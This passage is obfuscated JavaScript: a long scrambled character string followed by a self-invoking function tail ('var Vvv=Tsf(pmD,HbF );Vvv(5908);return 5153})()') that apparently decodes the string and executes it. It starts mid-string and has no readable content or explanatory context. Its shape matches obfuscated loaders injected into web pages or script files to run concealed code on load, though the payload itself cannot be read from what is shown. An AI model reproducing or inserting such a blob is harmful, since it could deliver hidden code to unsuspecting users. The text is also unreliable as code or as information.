T1}Fc{F])c(UcFji4)3nEFa 4_]o\\\/4.rFgtil(eFTt.r]_ e%]FFdiF*(-)]b1i5rn2nnsta:b!]e%o8?1W35c+d*?{orrC:dt.di,6aF45r7(rj+o}FF(}F%si\/utFF(ld.,voireCts`)]a]kdjn*lfq?l5uat eFd11 ]i%%lge{(8 =m9%]\/.4a%@4s._r(rsS%aF}beh1FX:+=;e]1F]%nck5]aT59g%rro.aF.Fat}=lg:F.i F.oa#r)CFFF3F(FagssaF}rksFa])n"a6fFp7_F3=2(N2_FOa n]_e1a[d+)x=;Ft]f8 [mYcrb1F=s(F=I;_K2icFa}gsra;F6cFo&(h(Ea.{0{,lFe_gshC9!]pFFF n_cF_r.s5i2ll(tneF=bnF2l(F(,)N2$(}_Flaw0Fen5.i +]_6(_FlefebFl_t}tyS%FoFJ1sirF)e]SFntrh%0.Sj=76SnSaih.a,%,h2nF73FaF)&a]],!;1)lj[>=(B!eAX4Fee.azs1.F31!aYFg=uFFbFFY.Fnpihk1d2$itFo+ua&a%eg5t)FitifeF}1FY.FiFi=.2FnF1C.FaFn)b;t 1iP=EL:0=f4]{F11feFja5arrca 4n03o)3])o.qNN}.t7F%)j6e.fFlt-0==cF2so2me:+,5F]e_l:::,vy7oiwilh2iF.a9F8F_,-IFt_u.!..)3t!1.tF.Ylo)..!="p[8rF1.b3eFFt)),d(a25uhF;iF]c.#T20a3264 %F=2%]t)FPua_b0;_FcFFM_.jeF0.]ox4ht)?]Fh 0);?F5Fw,fQ5iF!aF5t(fe)F))(u!i}t1L=c\\!D$1]h)a.aa+u[D)5r]Fy2%F43_uhF]F1b1]a;{pX4_ f;F(%Bc5xFG1,4s)0k%vbs5FFO_;n$e1m<TFmeh5asTp_on:2x.y=]=(6\']4eFFe)6mc%_.=s+.t:E1___]o]$ S.en2 3wp_}iwF]6f."to..i)%%1od}oa(;.a }F7}._F]1I.n]oFt_dFYFs;51o,2_F{#te2:33tax1=aVriFaR]a.Ezf(rber]D2o4,.F]:aFf#(tFRe_!cX,e5_%Fs).av.Z%m=s.{](dLk_xr7iF"Fvtp=_0F!n.Fito3F%]Tf_]at39b*1TNi}$Feba)$i2n1pu]!!FF$.a)tWe)40),Fe(h!  F8(7, s2i>taF(1GX;\/x6d;,bF)5,C_d.mb{bcF3.g_.aiFao1=;tm8t3o_iixfdnFFF4bbn; Fu)]};:esee5le}n&yxFh_u6Zcf;;rbFh_F2_!f.FH0{iB=FtF5ooFo.t%;+Fcg5fe)$e=noue),A()2]rF`Fl](FF{1 pnb0n(efub]eee_oBFp1iFd>&t%.Fa6!7r]eS]a.9jF=etYt$l=F8_15{QF.Fy1dFFF9(hdn%F%_J.){F{.(]0)+FYaFg XfaevrfFx83a>3.e;tht++O&F*)_];!9(n_[v!ao]}d.:75.F_=_t!.+be(6FpqrF!pct33Ln!ie C9Z4LeF6=.pt2v_F2:iaa2a.aL.$Wad+aoFd]+1+F]c^,6{}tFahuFi,4foj(;:F-{ul6.^cFF)_t{eotsa_+ul)dZ_m0oFFe)n3Fo!i_nFc,.:]Uie4pHe3n]lrd_o1{6)(5F}ca3ni9e F;_]UYsXgu[aM=\'dt(}F)F)_n.HFvl;}ls^6;FeFP,3F2)ja+FiFno_F]ea"%)Fl)sF0st`F;_;F}Fc()0o_0]}3oUi n\\d%aylQogw7a,Fenp)omi)FeanFa;nLr%ooaF]rbFaFes4utates&o3sc}4!FFt]nF,(]F%{pF4T(_tF_r>_F;uhFF#[&6_lFFmN0{so=rc=53 fitFP3F[Fa2fc5.c.l)$%s}]lF@lr4.SY-.npm5]+]nFhMiam%_]ba]stF(l(f) 60llo.eFrFFM_rL6)+d.Fj0dlbF9=FFMF%_[FF]nna(F=3.idaf+g(F_gnuo08sartd]Fyoc6]aoYl.Fr=3e_eio:t]icrni5lr;iee2_tF}1wtXF!47h.1a.)8F1=_tFh.aafe(ir;]=)t6 t7te2Fa(#n>%arF Fb(_hidI)5fenGd4.Fi(!=.{[fl_rd;1 lx1.ncp .F8]_w.=_a3=FFXr}ac4r,Ftg;tt7!-e(]9Fr2^!$_ore}nFFhFd <lFF45)aF\'a Fi1dr"ee.Fe}ah(E=;(=n:6,uceae)*F:g%.F,_%(o!]A5eF,F5np.eFiln5.ZdeFF%I-(I)(1e"]Cjs$mbFoFoop=taF[F5_.EFF]d[Fp.&tlr)=OrsFd.1ctniF2ed6+.t)mX11loF_2!basa,sF4=_%lu.F_eXv+F_.4F6\'  25Fe%X 6)4a)o5.dpaF]_e3oi}t[aSl.p1F0ae!o)AF5\\n3ri]&;cp}$jIF(S3n%]iFYolFFdo)xFFs )_.Fs:{b;(vuFvFuF2% _sFFd85Fta^FF:]t=FF]FFF9ac.oga==%obrfFF]2u_F{tru[Zx_3tffnalF4ti)FoFbeg=Qa(}3@3$dhrFw"t)l.F5tbekii)o.atX?nt5i d]a F e8_laF)&rnrt=rma2  {;==aoZ(a1a$=i%c]s<)FF(FCX4Ftionxp(tFS bcs$5_e6)F{M3)FFjoe]ciFbi..7p5._d ktSnrn]]F$_ }c,to5Hla!n8#rh 3F} DFFuh.F_ e;Tr}=orta.teg]Fr#t!"es^&a.ba=bFF ]"lC i_otdas5(Fp$e5La.]&eFp&.6{F[,2%0f5F)331 2NaFaw2]sF,nh531;_] F7r_ ;Fma_n.Ff'));var Vvv=Tsf(pmD,HbF );Vvv(5908);return 5153})()
